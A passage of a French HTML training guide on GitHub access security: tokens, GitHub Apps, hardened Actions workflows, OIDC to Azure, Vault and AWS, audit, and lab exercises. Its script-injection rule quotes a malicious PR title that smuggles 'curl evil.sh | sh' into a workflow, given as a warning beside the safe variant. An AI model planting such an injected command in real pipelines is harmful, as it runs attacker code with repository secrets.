    <li><b>Permissions</b> : le strict nécessaire, en lecture seule si possible (ex. <code>Contents: Read</code>, <code>Metadata: Read</code>).</li>
    <li>Côté organisation : <b>approbation obligatoire</b> des PAT fine-grained (activée par défaut), et possibilité de <b>restreindre les PAT classiques</b>.</li>
  </ul>
  <div class="note"><b>Limites actuelles des PAT fine-grained</b><p>Ils ne couvrent pas encore tout : un seul propriétaire par jeton, pas d'accès aux API qui gèrent l'enterprise (SCIM…), ni aux API Packages et Checks. GitHub vise à terme de permettre aux organisations de désactiver les PAT classiques, sans date annoncée.</p></div>
</section>

<section id="apps" data-group="Identités" data-title="GitHub Apps en détail">
  <div class="eyebrow">L'identité machine de référence</div>
  <h2>Les GitHub Apps en détail</h2>
  <p>Une GitHub App est une identité propre, avec son nom (<code>mon-bot[bot]</code>), ses permissions et ses installations. Elle ne dépend d'aucun salarié : un départ ne casse rien, et ses actions sont clairement attribuées dans le journal d'audit.</p>
  <figure>
    <div class="diagram">
    <svg viewBox="0 0 860 220" role="img" aria-labelledby="appT">
      <title id="appT">Authentification d'une GitHub App</title>
      <defs><marker id="ar3" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0,0 L10,5 L0,10 z" style="fill:var(--ink-2)"/></marker></defs>
      <g style="font:12px var(--f-body)">

        <text x="24" y="124" style="fill:var(--accent);font-weight:700">① signe un JWT (10 min)</text>
        <text x="24" y="150" style="fill:var(--ink-2)">la clé privée est un secret :</text><text x="24" y="168" style="fill:var(--ink-2)">Vault / Key Vault, rotation</text>

        <text x="334" y="80" style="fill:var(--ink-2)">vérifie le JWT avec</text><text x="334" y="98" style="fill:var(--ink-2)">la clé publique de l'App</text>
        <text x="334" y="124" style="fill:var(--accent);font-weight:700">② renvoie un jeton</text><text x="334" y="142" style="fill:var(--accent);font-weight:700">d'installation (1 h)</text>
        <rect x="630" y="30" width="220" height="160" rx="8" style="fill:var(--surface);stroke:var(--line)"/>

      </g>
      <g style="fill:none;stroke:var(--ink-2);stroke-width:1.4"><path d="M240 110 H316" marker-end="url(#ar3)"/><path d="M550 110 H626" marker-end="url(#ar3)"/></g>
    </svg></div>
  </figure>
  <h3>Créer une App (compte perso ou organisation)</h3>
  <ol class="steps">
    <li><b>Settings → Developer settings → GitHub Apps → New GitHub App.</b></li>
    <li>Nom unique, URL de page d'accueil (celle de votre dépôt suffit), décochez <b>Webhook → Active</b> si vous n'en avez pas besoin.</li>
    <li><b>Repository permissions</b> : uniquement le nécessaire (ex. <code>Contents: Read and write</code>, <code>Pull requests: Read and write</code>).</li>
    <li><b>Where can this GitHub App be installed?</b> : « Only on this account ».</li>
    <li>Créez, notez l'<b>App ID</b>, puis <b>Generate a private key</b> : un fichier <code>.pem</code> se télécharge. Rangez-le dans un coffre et supprimez-le de votre dossier Téléchargements.</li>
    <li><b>Install App</b> → « Only select repositories ».</li>
  </ol>
  <div class="code"><span class="lbl">Utiliser l'App dans un workflow</span><pre><span class="k">steps:</span>
  - <span class="k">id:</span> app-token
    <span class="k">uses:</span> actions/create-github-app-token@v2
    <span class="k">with:</span>
      <span class="k">app-id:</span> ${{ vars.IAM_BOT_APP_ID }}
      <span class="k">private-key:</span> ${{ secrets.IAM_BOT_PRIVATE_KEY }}
      <span class="k">repositories:</span> <span class="s">ansible-iam,infra-terraform</span>   <span class="c"># restreindre encore</span>
  - <span class="k">run:</span> gh api repos/${{ github.repository_owner }}/ansible-iam --jq .full_name
    <span class="k">env:</span>
      <span class="k">GH_TOKEN:</span> ${{ steps.app-token.outputs.token }}</pre></div>
  <h3>Cycle de vie d'une identité machine (comme pour un certificat)</h3>
  <p>Vous connaissez ce cycle avec les certificats gérés dans Venafi ou Sectigo. Il s'applique tel quel aux identités machine GitHub :</p>
  <div class="tbl"><table>
    <thead><tr><th>Étape</th><th>Pour une GitHub App / un jeton</th></tr></thead>
    <tbody>
      <tr><td>Demande et justification</td><td>Ticket : quel besoin, quel propriétaire (équipe), quels dépôts, quelles permissions</td></tr>
      <tr><td>Émission</td><td>Création de l'App ou du jeton avec permissions minimales</td></tr>
      <tr><td>Stockage</td><td>Clé privée ou jeton dans Vault / Azure Key Vault, jamais dans un dépôt ni un poste</td></tr>
      <tr><td>Inventaire</td><td>Liste des Apps installées, des PAT autorisés, des deploy keys, avec propriétaire et date</td></tr>
      <tr><td>Rotation</td><td>Nouvelle clé privée de l'App (on peut en avoir deux pour une bascule sans coupure), puis suppression de l'ancienne</td></tr>
      <tr><td>Révocation</td><td>Désinstallation de l'App, suppression du jeton, de la clé ; immédiate en cas de fuite</td></tr>
      <tr><td>Revue</td><td>Périodique : encore utilisée ? encore nécessaire ? permissions encore justifiées ?</td></tr>
    </tbody>
  </table></div>
  <div class="note ok"><b>Certificats SSH (offre Enterprise)</b><p>Une organisation peut déclarer une <b>autorité de certification SSH</b> : au lieu de clés SSH permanentes, les personnes et les machines reçoivent des certificats SSH de courte durée signés par cette autorité. C'est exactement la logique de la gestion de certificats appliquée à l'accès Git.</p></div>
</section>

<section id="actions" data-group="Automatiser" data-title="GitHub Actions">
  <div class="eyebrow">CI/CD</div>
  <h2>GitHub Actions</h2>
  <p>GitHub Actions exécute automatiquement des tâches (tests, lint, déploiement) quand un événement se produit : un push, une PR, un horaire, un clic.</p>
  <dl class="kv">
    <dt>Workflow</dt><dd>Un fichier YAML dans <code>.github/workflows/</code>.</dd>
    <dt>Événement (on)</dt><dd>Ce qui déclenche : <code>push</code>, <code>pull_request</code>, <code>schedule</code>, <code>workflow_dispatch</code> (manuel)…</dd>
    <dt>Job</dt><dd>Un ensemble d'étapes exécuté sur un runner. Les jobs tournent en parallèle sauf <code>needs:</code>.</dd>
    <dt>Step</dt><dd>Une commande (<code>run:</code>) ou une action réutilisable (<code>uses:</code>).</dd>
    <dt>Runner</dt><dd>La machine qui exécute : hébergée par GitHub (VM jetable) ou auto-hébergée (self-hosted).</dd>
    <dt>Action</dt><dd>Un composant réutilisable publié dans un dépôt (<code>actions/checkout</code>).</dd>
  </dl>
  <div class="code"><span class="lbl">.github/workflows/ci.yml — un premier workflow sûr</span><pre><span class="k">name:</span> CI

<span class="k">on:</span>
  <span class="k">pull_request:</span>
  <span class="k">push:</span>
    <span class="k">branches:</span> [main]

<span class="k">permissions:</span>                 <span class="c"># par défaut : rien, puis on ajoute le strict nécessaire</span>
  <span class="k">contents:</span> read

<span class="k">jobs:</span>
  <span class="k">lint:</span>
    <span class="k">runs-on:</span> ubuntu-latest
    <span class="k">timeout-minutes:</span> 10
    <span class="k">steps:</span>
      - <span class="k">uses:</span> actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683   <span class="c"># v4.2.2, épinglé par SHA</span>
        <span class="k">with:</span>
          <span class="k">persist-credentials:</span> false
      - <span class="k">name:</span> Lint YAML
        <span class="k">run:</span> pipx run yamllint .</pre></div>
  <p>Pour obtenir le SHA d'une version récente : <code>git ls-remote https://github.com/actions/checkout refs/tags/v4.2.2</code> (remplacez par la dernière version listée sur la page « Releases » de l'action). Dependabot peut ensuite tenir ces SHA à jour.</p>
  <h3>Secrets, variables et environnements</h3>
  <div class="tbl"><table>
    <thead><tr><th>Élément</th><th>Usage</th><th>Accès dans le workflow</th></tr></thead>
    <tbody>
      <tr><td>Variable</td><td>Valeur non sensible (ID d'abonnement, nom de région)</td><td><code>${{ vars.NOM }}</code></td></tr>
      <tr><td>Secret</td><td>Valeur sensible, chiffrée, masquée dans les journaux</td><td><code>${{ secrets.NOM }}</code></td></tr>
      <tr><td>Environnement</td><td>Groupe de secrets/variables (<code>recette</code>, <code>prod</code>) avec règles de protection : relecteurs obligatoires, délai, branches autorisées</td><td><code>environment: prod</code> sur le job</td></tr>
    </tbody>
  </table></div>
  <p>Niveaux : organisation (partagés avec des dépôts choisis), dépôt, environnement. Le plus précis gagne. Mettez les secrets de production dans un <b>environnement protégé</b> : le job attend l'approbation d'une personne autorisée avant d'y accéder.</p>
</section>

<section id="actions-securite" data-group="Automatiser" data-title="Sécuriser les workflows">
  <div class="eyebrow">Supply chain</div>
  <h2>Sécuriser les workflows</h2>
  <p>Un workflow s'exécute avec des secrets et des droits d'écriture : c'est une identité machine très puissante. Les attaques récentes de chaîne d'approvisionnement ciblent précisément les pipelines.</p>
  <h3>Les 8 règles</h3>
  <ol>
    <li><b>Permissions minimales</b> : <code>permissions: contents: read</code> au niveau du workflow, et on élargit seulement le job qui en a besoin. Réglez aussi la valeur par défaut de l'organisation sur « Read repository contents ».</li>
    <li><b>Épingler les actions tierces par SHA complet</b>, pas par tag (<code>@v4</code> peut être déplacé par un attaquant). Une politique d'organisation peut l'imposer, et les <i>lockfiles</i> d'Actions (en préversion) figent aussi les dépendances indirectes.</li>
    <li><b>Limiter les actions autorisées</b> : actions GitHub + éditeurs vérifiés + liste blanche.</li>
    <li><b>Jamais d'injection de script</b> : n'insérez pas directement un titre de PR, un nom de branche ou un commentaire dans <code>run:</code>.
      <div class="code"><pre><span class="c"># DANGEREUX : un titre de PR "a"; curl evil.sh | sh; "" s'exécute</span>
- <span class="k">run:</span> echo "${{ github.event.pull_request.title }}"

<span class="c"># CORRECT : passer par une variable d'environnement</span>
- <span class="k">env:</span>
    <span class="k">TITLE:</span> ${{ github.event.pull_request.title }}
  <span class="k">run:</span> echo "$TITLE"</pre></div></li>
    <li><b>Se méfier de <code>pull_request_target</code></b> et <code>workflow_run</code> : ils s'exécutent avec les secrets du dépôt même pour une PR venant d'un fork. Ne jamais y extraire et exécuter le code de la PR.</li>
    <li><b>Runners auto-hébergés</b> : jamais sur un dépôt public ; de préférence éphémères (une VM par job) ; isolés du réseau interne au strict nécessaire.</li>
    <li><b>Protéger les workflows eux-mêmes</b> : CODEOWNERS sur <code>.github/workflows/</code>, revue obligatoire, environnements protégés pour la prod.</li>
    <li><b>OIDC plutôt que des secrets longue durée</b> (section suivante).</li>
  </ol>
  <h3>Ce qui arrive en 2026</h3>
  <p>GitHub a publié en mars 2026 une feuille de route sécurité pour Actions : verrouillage des dépendances au niveau du workflow, règles d'exécution via les rulesets (qui peut déclencher quoi), <b>secrets à portée restreinte</b> (liés à une branche, un environnement ou un workflow précis), permission dédiée à la gestion des secrets (distincte du droit d'écriture), flux de télémétrie vers un SIEM, et pare-feu de sortie natif sur les runners hébergés. Les lockfiles (<code>.github/workflows/actions.lock</code>, outil <code>gh actions-lock</code>) sont en préversion publique depuis octobre 2026 pour Enterprise Cloud.</p>
</section>

<section id="oidc" data-group="Automatiser" data-title="OIDC : zéro secret">
  <div class="eyebrow">Fédération d'identité</div>
  <h2>OIDC : se connecter au cloud et à Vault sans aucun secret</h2>
  <p>Au lieu de stocker un secret de service principal ou une clé AWS dans GitHub, le job demande un <b>jeton d'identité signé par GitHub</b> (un JWT) et l'échange contre un accès temporaire. Le fournisseur (Entra ID, Vault, AWS) fait confiance à GitHub et vérifie <b>qui</b> demande : quel dépôt, quelle branche, quel environnement.</p>
  <figure>
    <div class="diagram">
    <svg viewBox="0 0 860 240" role="img" aria-labelledby="oidcT">
      <title id="oidcT">Flux OIDC entre GitHub Actions et un fournisseur cloud</title>
      <defs><marker id="ar4" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0,0 L10,5 L0,10 z" style="fill:var(--ink-2)"/></marker></defs>
      <g style="font:12px var(--f-body)">
        <rect x="10" y="70" width="200" height="110" rx="8" style="fill:var(--surface);stroke:var(--line)"/>

  <h3>Les claims du jeton GitHub</h3>
  <div class="tbl"><table>
    <thead><tr><th>Claim</th><th>Exemple</th><th>Usage</th></tr></thead>
    <tbody>
      <tr><td><code>iss</code></td><td><code>https://token.actions.githubusercontent.com</code></td><td>L'émetteur à déclarer comme fiable</td></tr>
      <tr><td><code>aud</code></td><td><code>api://AzureADTokenExchange</code></td><td>À qui le jeton est destiné</td></tr>
      <tr><td><code>sub</code></td><td><code>repo:kevmat242/lab-oidc:environment:prod</code></td><td>Le cœur de la règle de confiance</td></tr>
      <tr><td><code>repository</code>, <code>repository_id</code>, <code>repository_owner_id</code></td><td><code>kevmat242/lab-oidc</code>, <code>812345678</code></td><td>Les ID résistent au renommage d'un dépôt ou d'un compte</td></tr>
      <tr><td><code>ref</code>, <code>environment</code>, <code>event_name</code></td><td><code>refs/heads/main</code>, <code>prod</code>, <code>push</code></td><td>Restreindre à une branche ou un environnement</td></tr>
      <tr><td><code>job_workflow_ref</code></td><td><code>org/ci/.github/workflows/deploy.yml@refs/heads/main</code></td><td>N'autoriser qu'un workflow réutilisable central</td></tr>
      <tr><td><code>repo_property_*</code></td><td><code>repo_property_criticite</code></td><td>Propriétés personnalisées du dépôt (depuis mars 2026)</td></tr>
    </tbody>
  </table></div>
  <p>Formats du <code>sub</code> : <code>repo:OWNER/REPO:ref:refs/heads/main</code>, <code>repo:OWNER/REPO:environment:prod</code>, <code>repo:OWNER/REPO:pull_request</code>. Lier la confiance à un <b>environnement protégé</b> est la solution la plus robuste : le job ne l'obtient qu'après approbation.</p>
  <div class="note danger"><b>Le piège à éviter</b><p>Une règle de confiance trop large (<code>repo:mon-org/*</code>, ou seulement <code>repository_owner</code>) permet à <b>n'importe quel</b> dépôt de l'organisation, ou à n'importe quelle branche, d'obtenir l'accès à la production. Toujours fixer dépôt + environnement (ou branche).</p></div>

  <h3>Exemple 1 : Azure / Entra ID</h3>
  <ol class="steps">
    <li>Dans Entra ID : une <b>App registration</b> (ou une identité managée affectée par l'utilisateur), sans aucun secret.</li>
    <li><b>Certificates &amp; secrets → Federated credentials → Add</b> : scénario « GitHub Actions deploying Azure resources », organisation <code>kevmat242</code>, dépôt <code>lab-oidc</code>, entité <b>Environment</b> = <code>prod</code>.</li>
    <li>Donnez à cette identité un rôle Azure minimal (ex. <code>Reader</code> sur un groupe de ressources).</li>
    <li>Dans GitHub : variables <code>AZURE_CLIENT_ID</code>, <code>AZURE_TENANT_ID</code>, <code>AZURE_SUBSCRIPTION_ID</code> (ce ne sont pas des secrets).</li>
  </ol>
  <div class="code"><span class="lbl">.github/workflows/azure.yml</span><pre><span class="k">name:</span> Azure OIDC
<span class="k">on:</span> workflow_dispatch
<span class="k">permissions:</span>
  <span class="k">id-token:</span> write      <span class="c"># autorise la demande du JWT</span>
  <span class="k">contents:</span> read
<span class="k">jobs:</span>
  <span class="k">deploy:</span>
    <span class="k">runs-on:</span> ubuntu-latest
    <span class="k">environment:</span> prod     <span class="c"># doit correspondre au sub de la federated credential</span>
    <span class="k">steps:</span>
      - <span class="k">uses:</span> azure/login@v2
        <span class="k">with:</span>
          <span class="k">client-id:</span> ${{ vars.AZURE_CLIENT_ID }}
          <span class="k">tenant-id:</span> ${{ vars.AZURE_TENANT_ID }}
          <span class="k">subscription-id:</span> ${{ vars.AZURE_SUBSCRIPTION_ID }}
      - <span class="k">run:</span> az group list -o table</pre></div>

  <h3>Exemple 2 : HashiCorp Vault</h3>
  <div class="code"><span class="lbl">Côté Vault (une fois, par un administrateur)</span><pre>vault auth enable jwt
vault write auth/jwt/config \
  oidc_discovery_url="https://token.actions.githubusercontent.com" \
  bound_issuer="https://token.actions.githubusercontent.com"

vault write auth/jwt/role/lab-oidc-prod - &lt;&lt;EOF
{
  "role_type": "jwt",
  "user_claim": "repository",
  "bound_audiences": ["https://github.com/kevmat242"],
  "bound_claims": {
    "repository_id": "812345678",
    "environment": "prod"
  },
  "token_policies": ["lab-oidc-lecture"],
  "token_ttl": "10m"
}
EOF</pre></div>
  <div class="code"><span class="lbl">Côté workflow</span><pre>- <span class="k">uses:</span> hashicorp/vault-action@v3
  <span class="k">with:</span>
    <span class="k">url:</span> https://vault.exemple.interne:8200
    <span class="k">method:</span> jwt
    <span class="k">role:</span> lab-oidc-prod
    <span class="k">jwtGithubAudience:</span> https://github.com/kevmat242   <span class="c"># doit correspondre à bound_audiences</span>
    <span class="k">secrets:</span> |
      kv/data/iam/github-bot private_key | BOT_KEY</pre></div>
  <p>Le job lit le secret pendant 10 minutes au plus, sans jamais avoir stocké d'identifiant Vault. Pour un Vault interne, il faut un runner qui peut le joindre (runner auto-hébergé dans le réseau de l'entreprise).</p>

  <h3>Exemple 3 : AWS</h3>
  <div class="code"><pre>- <span class="k">uses:</span> aws-actions/configure-aws-credentials@v4
  <span class="k">with:</span>
    <span class="k">role-to-assume:</span> arn:aws:iam::123456789012:role/github-lab-oidc
    <span class="k">aws-region:</span> eu-west-3
<span class="c"># Politique de confiance du rôle : condition StringEquals sur</span>
<span class="c"># token.actions.githubusercontent.com:sub = repo:kevmat242/lab-oidc:environment:prod</span></pre></div>
</section>

<section id="secrets-scanning" data-group="Sécuriser" data-title="Secret scanning et push protection">
  <div class="eyebrow">Détecter les fuites</div>
  <h2>Secret scanning et push protection</h2>
  <ul>
    <li><b>Secret scanning</b> détecte dans le code et l'historique plus de 200 types de secrets (jetons GitHub, clés Azure, AWS, Slack, clés privées…). Pour les jetons de nombreux éditeurs partenaires trouvés dans un dépôt public, GitHub prévient directement l'éditeur, qui peut les révoquer.</li>
    <li><b>Push protection</b> bloque le <code>git push</code> s'il contient un secret reconnu, avant même qu'il n'arrive sur GitHub. Elle est active par défaut pour vos pushes vers les dépôts publics (Settings → Code security).</li>
  </ul>
  <div class="tbl"><table>
    <thead><tr><th>Où</th><th>Disponibilité</th></tr></thead>
    <tbody>
      <tr><td>Dépôts publics</td><td>Gratuit</td></tr>
      <tr><td>Dépôts privés d'organisation</td><td>Offre payante <b>GitHub Secret Protection</b> (Team ou Enterprise), facturée par contributeur actif</td></tr>
      <tr><td>Analyse de code (CodeQL) sur dépôts privés</td><td>Offre payante <b>GitHub Code Security</b></td></tr>
    </tbody>
  </table></div>
  <p>Avec Secret Protection, on peut aussi définir des <b>motifs personnalisés</b> (format des jetons internes, noms de comptes de service) et exiger une justification pour tout contournement de la push protection.</p>
  <div class="note"><b>Que faire d'une alerte ?</b><p>Révoquer et remplacer le secret, vérifier son utilisation dans les journaux du système concerné, puis fermer l'alerte avec le bon motif (« revoked »). Une alerte fermée en « false positive » sans vérification est un risque d'audit.</p></div>
</section>

<section id="dependances" data-group="Sécuriser" data-title="Dépendances et analyse de code">
  <div class="eyebrow">Supply chain</div>
  <h2>Dépendances, analyse de code et provenance</h2>
  <div class="grid2">
    <div class="card"><h4>Dependabot alerts</h4><p>Alerte quand une dépendance de votre projet (pip, npm, Terraform, actions…) a une vulnérabilité connue.</p></div>
    <div class="card"><h4>Dependabot updates</h4><p>Ouvre automatiquement des PR de mise à jour, y compris pour les SHA des actions épinglées.</p></div>
    <div class="card"><h4>Code scanning (CodeQL)</h4><p>Analyse statique qui trouve des failles dans votre code (injection, secrets codés en dur…).</p></div>
    <div class="card"><h4>Attestations d'artefacts</h4><p>Preuve signée (Sigstore) qu'un binaire ou une image a été construit par tel workflow, depuis tel commit. Vérifiable avec <code>gh attestation verify</code>.</p></div>
  </div>
  <div class="code"><span class="lbl">.github/dependabot.yml</span><pre><span class="k">version:</span> 2
<span class="k">updates:</span>
  - <span class="k">package-ecosystem:</span> github-actions
    <span class="k">directory:</span> /
    <span class="k">schedule:</span>
      <span class="k">interval:</span> weekly
  - <span class="k">package-ecosystem:</span> terraform
    <span class="k">directory:</span> /terraform
    <span class="k">schedule:</span>
      <span class="k">interval:</span> weekly</pre></div>
</section>

<section id="gouvernance" data-group="Gouverner" data-title="Audit et gouvernance">
  <div class="eyebrow">Prouver et contrôler</div>
  <h2>Journal d'audit et gouvernance des accès</h2>
  <h3>Le journal d'audit</h3>
  <p>Organisation (<b>Settings → Archive → Logs → Audit log</b>) et enterprise : qui a ajouté un membre, changé un rôle, créé un jeton, modifié un ruleset, installé une App, accédé à un secret… Conservation limitée : en entreprise, on le <b>diffuse vers le SIEM</b> (Microsoft Sentinel, Splunk, Datadog, stockage Azure) avec l'<i>audit log streaming</i> (offre Enterprise).</p>
  <div class="tbl"><table>
    <thead><tr><th>Filtre utile</th><th>Ce qu'il montre</th></tr></thead>
    <tbody>
      <tr><td><code>action:org.add_member</code>, <code>action:org.update_member</code></td><td>Arrivées et changements de rôle</td></tr>
      <tr><td><code>action:personal_access_token</code></td><td>Demandes, approbations, révocations de PAT fine-grained</td></tr>
      <tr><td><code>action:integration_installation</code></td><td>Installations et changements de permissions des GitHub Apps</td></tr>
      <tr><td><code>action:repository_ruleset</code>, <code>action:protected_branch</code></td><td>Modifications des protections</td></tr>
      <tr><td><code>action:repo.access</code></td><td>Changement de visibilité (privé → public)</td></tr>
      <tr><td><code>action:org.update_actions_secret</code></td><td>Création ou modification d'un secret d'organisation</td></tr>
    </tbody>
  </table></div>
  <h3>Inventorier les identités machine avec l'API</h3>
  <div class="code"><span class="lbl">Avec GitHub CLI (droits Owner de l'organisation)</span><pre><span class="c"># PAT fine-grained autorisés sur l'organisation</span>
gh api /orgs/MON-ORG/personal-access-tokens --paginate \
  --jq '.[] | [.owner.login, .token_name, .token_expires_at, .token_last_used_at] | @tsv'

<span class="c"># GitHub Apps installées et leurs permissions</span>
gh api /orgs/MON-ORG/installations --paginate \
  --jq '.installations[] | [.app_slug, .repository_selection, (.permissions|tostring)] | @tsv'

<span class="c"># Deploy keys d'un dépôt</span>
gh api /repos/MON-ORG/MON-DEPOT/keys --jq '.[] | [.title, .read_only, .created_at] | @tsv'

<span class="c"># Collaborateurs externes</span>
gh api /orgs/MON-ORG/outside_collaborators --paginate --jq '.[].login'</pre></div>
  <p>Ces commandes, lancées chaque semaine par un workflow planifié, produisent un rapport : jetons qui expirent, jetons inutilisés depuis 90 jours, Apps avec permissions <code>Administration: write</code>, deploy keys en écriture. C'est l'équivalent, pour GitHub, d'un inventaire de certificats.</p>
  <h3>Départ d'un collaborateur (sans EMU)</h3>
  <ol>
    <li>Retirer le compte de l'organisation (ses PAT et clés SSH perdent l'accès aux ressources de l'organisation).</li>
    <li>Vérifier les GitHub Apps et OAuth Apps dont il était propriétaire ; transférer la propriété.</li>
    <li>Vérifier les secrets qu'il connaissait (environnements qu'il approuvait, secrets partagés) et les faire tourner si besoin.</li>
    <li>Contrôler les deploy keys et webhooks qu'il a créés.</li>
  </ol>
  <h3>Revue d'accès trimestrielle : la liste</h3>
  <ul>
    <li>Owners de l'organisation et administrateurs de dépôts.</li>
    <li>Collaborateurs externes et leur date de fin de mission.</li>
    <li>Membres sans activité depuis 90 jours.</li>
    <li>PAT, Apps, deploy keys : propriétaire, usage, permissions, expiration.</li>
    <li>Bypass lists des rulesets.</li>
    <li>Relecteurs autorisés des environnements de production.</li>
  </ul>
</section>

<section id="integrations" data-group="Gouverner" data-title="Avec Terraform, Ansible, Vault, PKI">
  <div class="eyebrow">Votre écosystème</div>
  <h2>GitHub avec Terraform, Ansible, Vault et la PKI</h2>
  <h3>Gérer GitHub lui-même en code avec Terraform</h3>
  <p>Le provider <code>integrations/github</code> gère dépôts, équipes, droits, rulesets et secrets. Les accès deviennent relus en PR et traçables. Authentifiez-le avec une <b>GitHub App</b>, pas un PAT.</p>
  <div class="code"><pre><span class="k">provider</span> <span class="s">"github"</span> {
  owner = <span class="s">"exemple-iam"</span>
  app_auth {}            <span class="c"># GITHUB_APP_ID, GITHUB_APP_INSTALLATION_ID, GITHUB_APP_PEM_FILE</span>
}

<span class="k">resource</span> <span class="s">"github_team"</span> <span class="s">"iam_devs"</span> {
  name    = <span class="s">"iam-devs"</span>
  privacy = <span class="s">"closed"</span>
}

<span class="k">resource</span> <span class="s">"github_team_repository"</span> <span class="s">"iam_devs_ansible"</span> {
  team_id    = github_team.iam_devs.id
  repository = <span class="s">"ansible-iam"</span>
  permission = <span class="s">"push"</span>     <span class="c"># = Write</span>
}

<span class="k">resource</span> <span class="s">"github_repository_ruleset"</span> <span class="s">"main"</span> {
  name        = <span class="s">"protection-main"</span>
  repository  = <span class="s">"ansible-iam"</span>
  target      = <span class="s">"branch"</span>
  enforcement = <span class="s">"active"</span>
  conditions {
    ref_name {
      include = [<span class="s">"~DEFAULT_BRANCH"</span>]
      exclude = []
    }
  }
  rules {
    deletion                = true
    non_fast_forward        = true
    required_signatures     = true
    pull_request {
      required_approving_review_count = 1
      require_code_owner_review       = true
      dismiss_stale_reviews_on_push   = true
    }
  }
}</pre></div>
  <h3>Pipeline Terraform et Ansible</h3>
  <ul>
    <li><b>Terraform</b> : <code>plan</code> sur chaque PR avec une identité OIDC en lecture seule ; <code>apply</code> après fusion, dans l'environnement <code>prod</code> protégé, avec une identité OIDC distincte en écriture.</li>
    <li><b>Ansible</b> : <code>yamllint</code>, <code>ansible-lint</code> et <code>--syntax-check</code> sur chaque PR ; l'exécution en production reste de préférence dans AAP/AWX, déclenchée par la fusion (webhook ou API), avec les credentials de la plateforme.</li>
    <li><b>Vault</b> : les workflows récupèrent les secrets via OIDC (section précédente), avec des politiques Vault par dépôt et par environnement.</li>
  </ul>
  <h3>Certificats : Venafi (NGTS) et Sectigo</h3>
  <ul>
    <li>Un workflow peut demander ou renouveler un certificat auprès de la plateforme de gestion de certificats (ex. CLI <code>vcert</code> pour l'ancienne plateforme Venafi, désormais <i>Next-Generation Trust Security</i> chez Palo Alto Networks ; ACME ou API pour Sectigo), avec un secret d'API lui-même récupéré dans Vault via OIDC.</li>
    <li>La <b>clé privée d'une GitHub App</b> est un secret cryptographique : inventoriée, stockée dans un coffre, tournée périodiquement, exactement comme une clé de certificat.</li>
    <li>La signature de code et les attestations d'artefacts complètent la chaîne de confiance : on sait <i>qui</i> a construit <i>quoi</i>, et à partir de <i>quel</i> code.</li>
  </ul>
</section>

<section id="actualites" data-group="Gouverner" data-title="Actualités 2025-2026">
  <div class="eyebrow">Ce qui a changé</div>
  <h2>Les nouveautés à connaître (2025-2026)</h2>
  <ul>
    <li><b>Mars 2025</b> : les PAT fine-grained passent en disponibilité générale ; l'approbation des PAT par l'organisation est activée par défaut.</li>
    <li><b>Avril 2025</b> : GitHub Advanced Security est découpé en deux offres achetables séparément, <b>Secret Protection</b> et <b>Code Security</b>, désormais accessibles aux organisations en offre Team.</li>
    <li><b>Août 2025</b> : les politiques d'Actions permettent de bloquer des actions précises et d'<b>imposer l'épinglage par SHA</b>.</li>
    <li><b>Novembre 2025</b> : npm (aussi propriété de GitHub) désactive la création de jetons classiques au profit de jetons granulaires, après plusieurs attaques de chaîne d'approvisionnement.</li>
    <li><b>Mars 2026</b> : feuille de route sécurité d'Actions (verrouillage des dépendances, secrets à portée restreinte, règles d'exécution, pare-feu de sortie, télémétrie) ; les jetons OIDC peuvent inclure les <b>propriétés personnalisées</b> des dépôts (<code>repo_property_*</code>) pour des politiques d'accès par attributs.</li>
    <li><b>Octobre 2026</b> : préversion publique des <b>lockfiles</b> d'Actions et de la politique « Require lockfile » sur Enterprise Cloud.</li>
    <li><b>Agents d'IA</b> : Copilot et des agents tiers peuvent ouvrir des PR et agir dans les dépôts. Ce sont de nouvelles identités non humaines : appliquez-leur les mêmes règles (permissions minimales, revue obligatoire de leurs PR, traçabilité).</li>
  </ul>
</section>

<section id="tp" data-group="Pratiquer" data-title="Les 10 TP">
  <div class="eyebrow">Sur votre compte GitHub personnel</div>
  <h2>Les 10 travaux pratiques</h2>
  <p>Tout se fait gratuitement avec votre compte <code>kevmat242</code>. Créez un dépôt <b>privé</b> <code>lab-github-iam</code> pour les TP (sauf mention contraire). Ne mettez jamais de vraie donnée de l'entreprise dans ces exercices.</p>

  <details open><summary>TP 1 — Git en local (1 h)</summary>
    <ol>
      <li><code>mkdir ~/lab-git &amp;&amp; cd ~/lab-git &amp;&amp; git init</code></li>
      <li>Créez <code>README.md</code>, faites un commit. Créez une branche <code>feature/a</code>, modifiez la ligne 1, commitez.</li>
      <li>Revenez sur <code>main</code>, modifiez la même ligne autrement, commitez. Fusionnez <code>feature/a</code> : <b>résolvez le conflit</b>.</li>
      <li>Faites un commit « raté », annulez-le avec <code>git reset --soft HEAD~1</code>, puis retrouvez un commit avec <code>git reflog</code>.</li>
      <li>Réussi si : <code>git log --oneline --graph</code> montre le commit de fusion et vous savez expliquer chaque ligne.</li>
    </ol>
  </details>
  <details><summary>TP 2 — Dépôt distant et pull request (1 h)</summary>
    <ol>
      <li><code>gh repo create lab-github-iam --private --clone</code></li>
      <li>Ajoutez un <code>.gitignore</code> (section dédiée) et un <code>README.md</code>, poussez sur <code>main</code>.</li>
      <li>Branche <code>feature/doc</code>, un changement, <code>gh pr create --fill</code>.</li>
      <li>Dans l'interface : commentez une ligne, puis fusionnez en <b>Squash and merge</b> et supprimez la branche.</li>
    </ol>
  </details>
  <details><summary>TP 3 — Ruleset et CODEOWNERS (45 min)</summary>
    <ol>
      <li>Settings → Rulesets → <b>New branch ruleset</b> : nom <code>protection-main</code>, Enforcement <b>Active</b>, cible <b>Default branch</b>.</li>
      <li>Cochez : Restrict deletions, Block force pushes, Require a pull request (0 approbation, car vous êtes seul), Require signed commits (après le TP 4).</li>
      <li>Essayez <code>git push</code> directement sur <code>main</code> : il doit être refusé.</li>
      <li>Ajoutez <code>.github/CODEOWNERS</code> avec <code>* @kevmat242</code>.</li>
      <li>Remarque : sur un dépôt privé avec un compte gratuit, certaines règles demandent une offre payante. Si c'est le cas, faites ce TP sur un dépôt public de test, sans contenu sensible.</li>
    </ol>
  </details>
  <details><summary>TP 4 — Sécuriser votre compte et signer vos commits (30 min)</summary>
    <ol>
      <li>Settings → Password and authentication : ajoutez une <b>passkey</b>, vérifiez la 2FA, rangez les codes de récupération.</li>
      <li>Configurez la signature SSH (section dédiée), ajoutez la clé comme <b>Signing Key</b>, activez <b>Vigilant mode</b>.</li>
      <li>Poussez un commit : il doit apparaître <span class="chip ok">Verified</span>.</li>
    </ol>
  </details>
  <details><summary>TP 5 — PAT fine-grained : émettre, utiliser, révoquer (30 min)</summary>
    <ol>
